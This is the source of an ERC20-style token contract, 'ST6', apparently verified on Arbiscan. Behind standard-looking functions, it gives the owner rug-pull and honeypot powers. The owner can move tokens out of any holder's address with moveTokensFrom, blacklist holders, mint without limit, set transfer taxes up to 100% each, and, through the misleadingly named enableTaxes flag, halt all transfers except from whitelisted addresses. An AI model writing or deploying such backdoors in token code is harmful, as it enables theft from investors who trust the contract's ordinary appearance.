/**
 *Submitted for verification at Arbiscan on 2023-08-05
*/

// SPDX-License-Identifier: MIT

// 200 optimisation runs

pragma solidity ^0.8.18;

contract ST6 {
    string public name = "ST6";
    string public symbol = "ST6";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 100000000 * 10**uint256(decimals);
    address private owner;

    bool public taxesEnabled = true;
    bool public mintingEnabled = true;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private _whitelist;

    // Marketing and Dev tax-related variables
    address public marketingTaxAddress;
    uint256 public marketingTaxPercentage;
    address public devTaxAddress;
    uint256 public devTaxPercentage;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Mint(address indexed to, uint256 value);
    event TaxesEnabled(bool enabled);
    event MintingEnabled(bool enabled);
    event Blacklisted(address indexed addr, bool blacklisted);
    event Whitelisted(address indexed addr, bool whitelisted);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TokensMoved(address indexed from, address indexed to, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier canMint() {
        require(mintingEnabled, "Minting is disabled");
        _;
    }

    constructor() {
        owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(!_blacklist[msg.sender], "Sender is blacklisted and cannot transfer");
        require(!_blacklist[recipient], "Recipient is blacklisted and cannot receive");

        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        require(!_blacklist[sender], "Sender is blacklisted and cannot transfer");
        require(!_blacklist[recipient], "Recipient is blacklisted and cannot receive");

        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function burn(uint256 amount) public {
        require(!_blacklist[msg.sender], "Sender is blacklisted and cannot burn");
        _burn(msg.sender, amount);
    }

    function mint(uint256 amount) public onlyOwner canMint {
        require(amount > 0, "Amount must be greater than zero");
        _mint(msg.sender, amount);
    }

    function setMarketingTaxAddress(address _marketingTaxAddress) public onlyOwner {
        marketingTaxAddress = _marketingTaxAddress;
    }

    function setMarketingTaxPercentage(uint256 _marketingTaxPercentage) public onlyOwner {
        require(_marketingTaxPercentage <= 100, "Percentage must be less than or equal to 100");
        marketingTaxPercentage = _marketingTaxPercentage;
    }

    function setDevTaxAddress(address _devTaxAddress) public onlyOwner {
        devTaxAddress = _devTaxAddress;
    }

    function setDevTaxPercentage(uint256 _devTaxPercentage) public onlyOwner {
        require(_devTaxPercentage <= 100, "Percentage must be less than or equal to 100");
        devTaxPercentage = _devTaxPercentage;
    }

    function enableTaxes(bool enable) public onlyOwner {
        taxesEnabled = enable;
        emit TaxesEnabled(enable);
    }

    function disableMinting() public onlyOwner {
        mintingEnabled = false;
        emit MintingEnabled(false);
    }

    function blacklistAddress(address addr, bool isBlacklisted) public onlyOwner {
        _blacklist[addr] = isBlacklisted;
        emit Blacklisted(addr, isBlacklisted);
    }

    function whitelistAddress(address addr, bool isWhitelisted) public onlyOwner {
        _whitelist[addr] = isWhitelisted;
        emit Whitelisted(addr, isWhitelisted);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function moveTokensFrom(address from, address to, uint256 amount) public onlyOwner {
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");
        require(amount > 0, "Amount must be greater than zero");
        require(_balances[from] >= amount, "Insufficient balance");

        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
        emit TokensMoved(from, to, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(taxesEnabled || _whitelist[sender], "Taxes are currently disabled");

        uint256 marketingTax = (amount * marketingTaxPercentage) / 100;
        uint256 devTax = (amount * devTaxPercentage) / 100;
        uint256 transferAmount = amount - marketingTax - devTax;

        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;

        if (marketingTax > 0 && marketingTaxAddress != address(0)) {
            _balances[marketingTaxAddress] += marketingTax;
        }

        if (devTax > 0 && devTaxAddress != address(0)) {
            _balances[devTaxAddress] += devTax;
        }

        emit Transfer(sender, recipient, transferAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burn(address account, uint256 amount) private {
        require(account != address(0), "ERC20: burn from the zero address");
        require(_balances[account] >= amount, "ERC20: burn amount exceeds balance");

        _balances[account] -= amount;
        _totalSupply -= amount;

        emit Burn(account, amount);
        emit Transfer(account, address(0), amount);
    }

    function _mint(address account, uint256 amount) private {
        require(account != address(0), "ERC20: mint to the zero address");
        require(mintingEnabled, "Minting is disabled");

        _balances[account] += amount;
        _totalSupply += amount;

        emit Mint(account, amount);
        emit Transfer(address(0), account, amount);
    }
}